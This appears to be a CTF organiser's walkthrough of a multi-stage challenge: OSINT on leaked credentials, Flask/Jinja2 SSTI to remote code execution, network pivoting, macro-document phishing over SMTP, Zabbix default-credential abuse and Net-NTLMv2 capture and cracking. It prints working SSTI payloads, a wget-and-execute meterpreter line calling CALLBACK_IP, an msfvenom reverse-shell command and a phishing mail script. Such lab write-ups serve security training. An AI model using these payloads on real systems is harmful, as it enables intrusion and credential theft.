We scroll until we find out a tweet which gives his Github account. GitHub On the Github activity, we can find out that he contributed on 1 project “instagram-terminal-news-feed”. On the project we look at his commits. Here we find the commit “Oops, removed credentials from repo”. We look at it. Here we obtain 2 informations: his instagram account; his instagram password. Instagram We attempt to connect on instagram using his credentials. But it does not work. However the instagram account really exists. So we will take a look to its content. We find the face for our target and it is Harold. We look at the pictures posted on the social media. We find an interesting picture. On the picture found on the Instagram. We can read on one screen Compte Rendu S... and PharmaHealthyCat. OK, It smells better than a website which distributes malwares. Let’s google it. Google again LinkedIn We find linkedin account related to this name. Let’s take a look the Linkedin pages. By looking at one of this profile, we find a company page named PharmaHealthyCat like in the Instagram image. On the company page, we can find a website https://phealthycat.org and our target (Harold) whose name is Jean Luc Delafont. The Website When accessing the web site, we have a short presentation of the company. We also get a piece of information that we will be needed later: the email address of the HR Lucie Bayard lucie.bayard@phealthycat.org By browsing the Blog, we can find the flag in base64: ECW{N1ckN4me_1s_G0Od_If_Y0u_D0n&apos;t_Thr0w}. Fun Fact: Malware site Here some challengers looked at profiles of the users who liked the image. And by looking at the user piratemonster1337. We find a website monster.casa which allows users to download a malware. Some challengers attempted to scan the website in order to find vulnerabilities and some others attempted to reverse the malware thinking it was part of the challenger. This website appeared to have been DOS by some challengers due to the scans performed. RIP unknown man. Fun Fact: Collateral damage Other challengers went a little offroad on Twitter users following our fake account and less malicious sites may have met a similar end … When admins got aware of this information, a Discord message was sent to tell challengers that if they don’t find a flag on the website, it was probably the wrong one. This Hint noone found During the tests of the challenge our tester told us the DNS entries for phealthycat.org pointed the mailer to our hosting provider (OVH). We then decided to configure the MX entry to point an internal IP address to give a hint where [not] to go next. Step 2 - Web Application Pentest The application allows users to create an account. For this Write-up, we will create an account named writeup. Once connected with our account, we have two solution to escalate our privileges: Break the Flask cookie and craft a new one with an other ID which is admin; Find the ACL flaw to become admin. Intended way: Weak ACL The intended way was to access the endpoint /home/users. With a little directory discovery, we can easily find this endpoint. On this page, we can see the list of all users with a “disabled” button Change Privileges. We look for our user and click on the button after removing the HTML attribute disabled. We are now admin and have access to new features. Particulary the feature Template builder. Smell the SSTI here. Unintended way: Cookie Flask with weak secret An other possibity was to break the flask cookie due to a weak secret key (key). OOPS. With that secret, we can change and reforge our cookie and take the ID of an admin user. Fun Fact: Pranksters A challenger sent me a DM on Discord, wondering if his method was intended. He sent with his real email address an email to Lucie Bayard, and became admin. Unfortunantly for him, an other challenger put him admin. Therefore he thought that was the solution until someone rolled-back his privileges. RIP. SSTI Now that we can access the template feature, we can perform some remote code execution. Here again there were two ways: Easy way: use TemplateReference object to call the os.system; The payload using TemplateReference: {{ self._TemplateReference__context.cycler.__init__.__globals__.os.system(&quot;CMD&quot;) }} Hard way: use object introspection to find subprocess.popen method. For the hard way, we enumerate the subclasses to find the subprocess.popen method. We sort all the classes and method to find the offset of our method. It appears to be the offset 418 - 1 (array start at 0). Therefore by calling {{ ().__class__.__bases__[0].__subclasses__()[417](&quot;CMD&quot;) }} we obtain the popen method to perform arbitrary command. Now that we have a RCE on the application, we now want a shell. For that, we’ll make the application to download a meterpreter and execute it. The payload will be: cd /tmp &amp;amp;&amp;amp; wget http://&amp;lt;CALLBACK_IP&amp;gt;/meter.elf &amp;amp;&amp;amp; chmod +x /tmp/meter.elf &amp;amp;&amp;amp; /tmp/meter.elf. To craft the meterpreter I used: msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -a x64 LHOST=&amp;lt;CALLBACK_IP&amp;gt; LPORT=PORT &amp;gt; meter.elf Now we can navigate to /app to retrieve the flag ECW{EaSy_P4rt_D0ne_C0ngratz}. Step 3 - Phishing some HR Pivot with the web app Now we have a shell on the application, we now have to find out what to do. After some enumeration, we realise we are in a docker container (/.dockerenv) and that we can’t privesc on the machine. So we will perform a network scan using ping. for i in `seq 1 100`; do ping -c 1 -w 1 172.19.0.$i;done We observe the following IP addresses: 172.19.0.1 (We assume that is the docker gateway); 172.19.0.2 (We are here); 172.19.0.3; 172.19.0.4. To perform port scan, we will setup proxychains to be able to use netcat. For that we used the metasploit modules: multi/manage/autoroute; server/socks_proxy. And then we will use echo, netcat and proxychains to scan each machine. We will only select some classic ports: 21 (FTP) 22 (SSH) 25 (SMTP) 80 (HTTP) 443 (HTTPS) 445 (SMB) 3306 (MySQL) 5900 (VNC) On the machine 172.19.0.3, we have found the port 3306 opened. We can assume that it is the database of the web application. If we scan the second machine: We can find a SMTP port open. If we remember the Part1 of the challenge, it was said “Send your resume to Lucie Bayard”. So we need to perform some spear phishing on Lucie Bayard. Fun Fact: Database under presure For a lot of challengers, the database was the man to kill. I received multiple DM on discord if it was normal if their attacks didn’t work. Hello une petite question, normal que ça marche pas ça ? Quand j’essaye chez moi (a gauche) j’arrive bien à lire le fichier hello, normal aussi que je puisse pas faire ca ? parce que ce doc avait quand même l’air d’être au petits oignions https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf People attacked so much the database that I wanted to rename it to “yamete kudasai”. Phishing click master As the challenge description informs us we are looking for a NTLM hash, we will assume we target a Windows workstation. Then, we will create a docm using metasploit And we will use the first script we find on a random github (https://gist.github.com/boina-n/e43b996fa0f520c918e3ed6beb754447) to sent it: #!/bin/bash filename=&quot;/tmp/msf.docm&quot; subject=&quot;Subject of my email&quot; txtmessage=&quot;This is the message I want to send&quot; { sleep 1; echo &quot;EHLO phealthycat.org&quot; sleep 1; echo &quot;MAIL FROM: &amp;lt;test@phealthycat.org&amp;gt;&quot; sleep 1; echo &quot;RCPT TO: &amp;lt;lucie.bayard@phealthycat.org&amp;gt;&quot; sleep 1; echo &quot;DATA&quot; sleep 1; echo &quot;Subject:&quot; $subject sleep 1; echo &quot;Content-Type: multipart/mixed; boundary=&quot;KkK170891tpbkKk__FV_KKKkkkjjwq&quot;&quot; sleep 1; echo &quot;&quot; sleep 1; echo &quot;This is a MIME formatted message. If you see this text it means that your&quot; sleep 1; echo &quot;email software does not support MIME formatted messages.&quot; sleep 1; echo &quot;&quot; sleep 1; echo &quot;--KkK170891tpbkKk__FV_KKKkkkjjwq&quot; sleep 1; echo &quot;Content-Type: text/plain; charset=UTF-8; format=flowed&quot; sleep 1; echo &quot;Content-Disposition: inline&quot; sleep 1; echo &quot;&quot; sleep 1; echo $txtmessage sleep 1; echo &quot;&quot; sleep 1; echo &quot;&quot; sleep 1; echo &quot;--KkK170891tpbkKk__FV_KKKkkkjjwq&quot; sleep 1; echo &quot;Content-Type: file --mime-type -b filename-$(date +%y%m%d).zip; name=filename-$(date +%y%m%d).docm&quot; sleep 1; echo &quot;Content-Transfer-Encoding: base64&quot; sleep 1; echo &quot;Content-Disposition: attachment; filename=&quot;filename-$(date +%y%m%d).docm&quot;;&quot; sleep 1; echo &quot;&quot; sleep 1; # The content is encoded in base64. cat $filename | base64; sleep 1; echo &quot;&quot; sleep 1; echo &quot;&quot; sleep 1; echo &quot;--KkK170891tpbkKk__FV_KKKkkkjjwq--&quot; sleep 1; echo &quot;&quot; sleep 1; echo &quot;.&quot; sleep 1; echo &quot;quit&quot; } | proxychains nc 172.19.0.4 25 Once the mail is sent thanks to our superb script, we just have to wait for the callback. Now that we have a shell on the HR, we can grab the flag on the Desktop: ECW{Hum4n_1s_Th3_W3akest_P0int}. Fun Fact: Funny emails received During the challenge, I looked on some emails received by the HR. Some challengers sent various payload with make me laught. Unfortunately I didn’t screen people who sent Linux payloads in the email body. But I could have catch some funny emails. PHP INFO WTF ? I really don’t know ? This guy is at the end of his life :’) Step 4 - CISO here I come Recon on HR Once we got a shell, we need to find a way to get to the CISO (Jean Luc Delafont). First we will dig in the home directory of Lucie. By looking in the Download folder, we can find an interesting file: zabbix_agent-5.4.4-windows-amd64-openssl.msi. We can also find an other file ThisIsNotAHint.jpeg. This file is not usefull for the challenge, he was only here to make challengers to remember good old memories :). . Now we know there is something related to Zabbix in this challenge. Let’s check if the agent is installed on the system and if so, we can look at the configuration file. By looking at the configuration file, we can find the Zabbix server address IP: 192.168.12.234 Fun Fact: Where is the LPE A lot of people tried to escalate their privileges on the HR workstation, however there was no way to do so. Some were so deseperated that they tried some random DLL hijacking. Zabbix Now that we have the Zabbix server IP, we can attempt to connect on it. By accessing the IP through HTTP (http://192.168.12.234), we can successfuly connect to interface using defaut Zabbix credentials: login: Admin password: zabbix Once connected we can navigate to the Administration section and use the scripts feature to perform remote code execution on the agents. By executing a simple whoami command, we can identify that the agent runs with phealthycat\jldelafont (our target) privileges. A first thing that we can try, is to make the agent connect to a SMB server that we host through UNC path to capture the Net-NTLMv2 of our target. It can be done by using smbserver.py from the impacket tools. A lot of challengers used Responder for its SMB server part, but it is not its primary function. That’s why smbserver.py from impacket is more appropriated. To execute our script, we need to manually execute it on our agent through the Last data page of the Zabbix server. Once our script executed, we can see on our impacket server the Net-NTLMv2 of our target. With this Net-NTLMv2, we can attempt to crack it with John-The-Ripper and the famous wordlist Rock-You. We can easily discover our target’s password in plain text: Blink182. Now that we have the plain text password, we can reforge the NT hash which is only our plain text password encoded in UTF-16-LE and hashed in MD4 (without the newline). We now have our last flag: ECW{c2367169e3279fa3e85d9d25f0e85e45} Fun Fact: OMG WinDef A lot of challengers wanted to launch a meterpreter or a reverse shell on the machine. However Windows Defender was running on the machine. I got a some DM about bypassing the antivirus. They tried some obscure russian things… Once they finnally succeed to deploy a meterpreter or a reverse shell on the machine and flag the last step, I happily told them that bypassing Windows Defender was not necessary to flag the last step. Conclusion This year we aimed to create a BIG challenge summarizing our most typical penetration testing mission We hope you liked it and had as much fun playing it than we had creating it :)</summary></entry></feed>